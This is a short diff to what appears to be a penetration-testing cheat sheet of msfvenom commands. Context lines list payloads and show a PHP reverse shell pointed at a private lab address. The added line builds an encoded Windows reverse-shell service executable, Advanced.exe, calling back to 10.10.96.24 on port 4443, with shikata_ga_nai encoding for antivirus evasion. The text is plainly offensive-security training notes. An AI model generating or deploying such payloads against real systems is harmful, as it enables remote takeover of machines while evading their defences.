@@ -41,6 +41,9 @@ msfvenom -l payloads # List msfvenom payloads
 msfvenom --list format # List supported output formats
 msfvenom -p php/reverse_php LHOST=10.0.2.19 LPORT=7777 -f raw > # Generating a Reverse Shell
 msfvenom --list payloads | grep meterpreter # List all meterpreter payloads
+msfvenom -p windows/shell_reverse_tcp LHOST=10.10.96.24 LPORT=4443 -e x86/shikata_ga_nai -f exe-service -o Advanced.exe
+
+
 
 
 # ===========
